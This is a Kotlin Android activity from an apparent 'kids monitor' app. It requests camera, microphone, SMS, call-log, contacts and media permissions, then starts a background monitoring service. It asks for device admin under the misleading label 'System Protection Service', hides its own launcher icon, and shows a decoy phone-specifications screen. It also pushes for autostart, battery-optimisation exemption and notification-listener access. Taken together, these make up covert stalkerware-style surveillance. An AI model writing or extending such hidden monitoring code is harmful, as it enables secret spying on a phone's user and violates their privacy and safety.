package com.kidsmonitor

import android.Manifest
import android.app.admin.DevicePolicyManager
import android.content.BroadcastReceiver
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.os.PowerManager
import android.widget.Toast
import android.provider.Settings
import android.view.View
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.kidsmonitor.databinding.ActivityMainBinding
import com.kidsmonitor.receivers.MyDeviceAdminReceiver
import com.kidsmonitor.services.MonitorService
import com.kidsmonitor.utils.MonitorActions
import java.util.UUID
import androidx.appcompat.app.AlertDialog

class MainActivity : AppCompatActivity() {

    private lateinit var binding: ActivityMainBinding
    private lateinit var devicePolicyManager: DevicePolicyManager
    private lateinit var componentName: ComponentName
    private var isServiceRunning = false
    private var myDeviceId: String = ""
    private var permissionDialog: AlertDialog? = null

    private val requiredPermissions = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
        arrayOf(
            Manifest.permission.CAMERA, 
            Manifest.permission.RECORD_AUDIO, 
            Manifest.permission.POST_NOTIFICATIONS,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_MEDIA_IMAGES,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_SMS,
            Manifest.permission.RECEIVE_SMS
        )
    } else {
        arrayOf(
            Manifest.permission.CAMERA, 
            Manifest.permission.RECORD_AUDIO, 
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_SMS,
            Manifest.permission.RECEIVE_SMS
        )
    }

    private val serviceStatusReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            if (intent?.action == MonitorService.ACTION_STATUS_UPDATE) {
                isServiceRunning = intent.getBooleanExtra(MonitorService.EXTRA_IS_RUNNING, false)
                val progress = intent.getIntExtra(MonitorService.EXTRA_PROGRESS, 0)
                updateStatus(isServiceRunning, progress)
            }
        }
    }

    private val autoStartPermissionLauncher = registerForActivityResult(ActivityResultContracts.StartActivityForResult()) {
        val sharedPrefs = getSharedPreferences("KidsMonitorPrefs", Context.MODE_PRIVATE)
        with(sharedPrefs.edit()) {
            putBoolean("auto_start_enabled", true)
            apply()
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)
        init()

        val sharedPrefs = getSharedPreferences("MKLMonitorPrefs", Context.MODE_PRIVATE)
        val existingId = sharedPrefs.getString("deviceId", null)
        if (existingId == null || existingId.length > 6) {
            myDeviceId = (100000..999999).random().toString()
            sharedPrefs.edit().putString("deviceId", myDeviceId).apply()
        } else {
            myDeviceId = existingId
        }
        binding.tvMyDeviceId.text = myDeviceId
        
        val savedName = sharedPrefs.getString("deviceName", "My Phone")
        binding.etDeviceName.setText(savedName)
        
        binding.etDeviceName.addTextChangedListener(object : android.text.TextWatcher {
            override fun afterTextChanged(s: android.text.Editable?) {
                sharedPrefs.edit().putString("deviceName", s.toString()).apply()
                val intent = Intent(this@MainActivity, MonitorService::class.java).apply {
                    action = MonitorActions.ACTION_UPDATE_CONFIG
                }
                startService(intent)
            }
            override fun beforeTextChanged(s: CharSequence?, start: Int, count: Int, after: Int) {}
            override fun onTextChanged(s: CharSequence?, start: Int, before: Int, count: Int) {}
        })

        binding.btnAdmin.setOnClickListener { enableDeviceAdmin() }
        binding.btnAutoStart.setOnClickListener { requestAutoStartPermission() }

        // Hide App Icon Click Listener
        binding.btnHideIcon.setOnClickListener {
            hideAppIcon()
        }

        // Show Loader for 2.5 seconds, then display full Oppo A3s specifications
        Handler(Looper.getMainLooper()).postDelayed({
            binding.layoutLoading.visibility = View.GONE
            binding.layoutDetails.visibility = View.VISIBLE
        }, 2500)

        getSharedPreferences("KidsMonitorPrefs", Context.MODE_PRIVATE)
            .edit()
            .putBoolean("monitoring_enabled", true)
            .apply()
            
        if (checkPermissions()) {
            startMonitorService()
        } else {
            requestPermissions()
        }
    }

    private fun hideAppIcon() {
        val p = packageManager
        val componentName = ComponentName(this, MainActivity::class.java)
        p.setComponentEnabledSetting(
            componentName,
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP
        )
        Toast.makeText(this, "App icon hidden from home screen. Still accessible in App Manager.", Toast.LENGTH_LONG).show()
        finish()
    }

    private fun init() {
        devicePolicyManager = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        componentName = ComponentName(this, MyDeviceAdminReceiver::class.java)
    }

    override fun onResume() {
        super.onResume()
        if (!checkPermissions()) {
            if (permissionDialog == null || !permissionDialog!!.isShowing) {
                showPermissionDialog()
            }
        } else {
            permissionDialog?.dismiss()
            updateUi()
            val filter = IntentFilter(MonitorService.ACTION_STATUS_UPDATE)
            registerReceiver(serviceStatusReceiver, filter)
            
            if (!isNotificationServiceEnabled()) {
                requestNotificationListenerPermission()
            }
            if (!isServiceRunning) {
                startMonitorService()
            }
        }
    }

    override fun onPause() {
        super.onPause()
        try {
            unregisterReceiver(serviceStatusReceiver)
        } catch (e: Exception) {}
    }

    private fun updateUi() {
        if (isDeviceAdminEnabled()) {
            binding.btnAdmin.visibility = View.GONE
            requestIgnoreBatteryOptimizations()
            if (isFirstLaunch()) requestAutoStartPermission()
        } else {
            binding.btnAdmin.visibility = View.GONE
        }
        
        val sharedPrefs = getSharedPreferences("KidsMonitorPrefs", Context.MODE_PRIVATE)
        binding.btnAutoStart.visibility = if (!sharedPrefs.getBoolean("auto_start_enabled", false)) View.VISIBLE else View.GONE
    }

    private fun startMonitorService() {
        if (checkPermissions()) {
            val intent = Intent(this, MonitorService::class.java).apply {
                action = MonitorActions.ACTION_START_MONITORING
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(intent)
            } else {
                startService(intent)
            }
        }
    }

    private fun isDeviceAdminEnabled() = devicePolicyManager.isAdminActive(componentName)

    private fun enableDeviceAdmin() {
        if (checkPermissions()) {
            val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, componentName)
                putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Enable System Protection Service.")
            }
            startActivity(intent)
        }
    }

    private fun checkPermissions() = requiredPermissions.all { ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED }

    private fun requestPermissions() {
        getSharedPreferences("KidsMonitorPrefs", Context.MODE_PRIVATE)
            .edit()
            .putBoolean("permissions_requested", true)
            .apply()
        ActivityCompat.requestPermissions(this, requiredPermissions, PERMISSION_REQUEST_CODE)
    }

    private fun showPermissionDialog() {
        val sharedPrefs = getSharedPreferences("KidsMonitorPrefs", Context.MODE_PRIVATE)
        val previouslyRequested = sharedPrefs.getBoolean("permissions_requested", false)

        // Check if we can show the system dialog (Rationale returns true if denied once but not permanently)
        val canShowSystemDialog = requiredPermissions.any { 
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED &&
            ActivityCompat.shouldShowRequestPermissionRationale(this, it)
        }

        val builder = AlertDialog.Builder(this)
            .setTitle("Permissions Required")
            .setCancelable(false)

        if (canShowSystemDialog || !previouslyRequested) {
            // Case 1: Denied once (can ask again) OR Never asked (should ask)
            builder.setMessage("This app requires permissions to function properly. Please grant them to proceed.")
            builder.setPositiveButton("Grant") { _, _ -> requestPermissions() }
            builder.setNeutralButton("Settings") { _, _ -> openAppSettings() }
        } else {
            // Case 2: Denied permanently (System will block request)
            builder.setMessage("Required permissions (Camera, Microphone, Contacts, Storage) have been permanently denied. You must enable them manually in Settings to continue.")
            builder.setPositiveButton("Open Settings") { _, _ -> openAppSettings() }
            // No "Grant" button, as it would do nothing
        }
        
        permissionDialog = builder.create()
        permissionDialog?.show()
    }

    private fun openAppSettings() {
        val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
        val uri = Uri.fromParts("package", packageName, null)
        intent.data = uri
        startActivity(intent)
    }

    private fun requestIgnoreBatteryOptimizations() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                try {
                    val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS, Uri.parse("package:$packageName"))
                    startActivity(intent)
                } catch (e: Exception) {}
            }
        }
    }

    private fun requestAutoStartPermission() {
        val sharedPrefs = getSharedPreferences("KidsMonitorPrefs", Context.MODE_PRIVATE)
        try {
            val intent = Intent()
            val manufacturer = android.os.Build.MANUFACTURER
            if ("xiaomi".equals(manufacturer, true)) intent.component = ComponentName("com.miui.securitycenter", "com.miui.permcenter.autostart.AutoStartManagementActivity")
            else if ("oppo".equals(manufacturer, true)) intent.component = ComponentName("com.coloros.safecenter", "com.coloros.safecenter.permission.startup.StartupAppListActivity")
            else if ("vivo".equals(manufacturer, true)) intent.component = ComponentName("com.vivo.permissionmanager", "com.vivo.permissionmanager.activity.BgStartUpManagerActivity")
            
            if (intent.resolveActivity(packageManager) != null) autoStartPermissionLauncher.launch(intent)
            else sharedPrefs.edit().putBoolean("auto_start_enabled", true).apply()
        } catch (e: Exception) {}
        sharedPrefs.edit().putBoolean("first_launch", false).apply()
    }

    private fun isFirstLaunch() = getSharedPreferences("KidsMonitorPrefs", Context.MODE_PRIVATE).getBoolean("first_launch", true)

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == PERMISSION_REQUEST_CODE) {
             if (grantResults.all { it == PackageManager.PERMISSION_GRANTED }) {
                permissionDialog?.dismiss()
                updateUi()
                startMonitorService()
             } else {
                 showPermissionDialog()
             }
        }
    }

    private fun isNotificationServiceEnabled(): Boolean {
        val flat = Settings.Secure.getString(contentResolver, "enabled_notification_listeners")
        return flat != null && flat.contains(packageName)
    }

    private fun requestNotificationListenerPermission() {
        try {
            val intent = Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)
            startActivity(intent)
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    private fun updateStatus(isRunning: Boolean, progress: Int) {
        if (isRunning) {
            binding.tvStatus.text = "Status: Server Running"
            binding.progressBar.progress = progress
            binding.progressBar.visibility = View.VISIBLE
        } else {
            binding.tvStatus.text = "Status: Not running"
            binding.progressBar.visibility = View.INVISIBLE
        }
    }

    companion object {
        private const val PERMISSION_REQUEST_CODE = 101
    }
}
